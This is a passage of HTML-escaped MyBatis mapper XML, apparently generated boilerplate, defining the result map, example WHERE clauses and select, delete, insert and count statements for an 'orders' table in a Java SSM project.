    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;number&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;number&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;createtime&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;createtime&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;TIMESTAMP&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;note&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;note&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;VARCHAR&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;resultMap&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value} and #{criterion.secondValue}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt; open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                    #{listItem}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;where &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;example.oredCriteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criteria&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;or&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criteria.valid&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; prefixOverrides&lt;/span&gt;&lt;span&gt;=&quot;and&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criteria.criteria&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;criterion&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;choose &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.noValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.singleValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.betweenValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition} #{criterion.value} and #{criterion.secondValue}
                &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;when &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;criterion.listValue&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                  and ${criterion.condition}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;foreach &lt;/span&gt;&lt;span&gt;collection&lt;/span&gt;&lt;span&gt;=&quot;criterion.value&quot;&lt;/span&gt;&lt;span&gt; item&lt;/span&gt;&lt;span&gt;=&quot;listItem&quot;&lt;/span&gt;&lt;span&gt; open&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; close&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; separator&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                    #{listItem}
                  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;when&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
              &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;choose&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
          &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;where&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;sql &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    id, user_id, number, createtime, note
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByExample&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.OrdersExample&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;distinct&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      distinct
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    from orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;orderByClause != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      order by ${orderByClause}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select 
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    from orders
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    delete from orders
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.OrdersExample&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    delete from orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insert&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Orders&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    insert into orders (id, user_id, number, 
      createtime, note)
    values (#{id,jdbcType=INTEGER}, #{userId,jdbcType=INTEGER}, #{number,jdbcType=VARCHAR}, 
      #{createtime,jdbcType=TIMESTAMP}, #{note,jdbcType=VARCHAR})
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insertSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Orders&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    insert into orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        id,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;userId != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        user_id,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;number != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        number,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;note != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        note,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;values (&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{id,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;userId != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{userId,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;number != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{number,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;note != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{note,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;countByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.OrdersExample&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select count(*) from orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExampleSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update orders
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        id = #{record.id,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.userId != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        user_id = #{record.userId,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
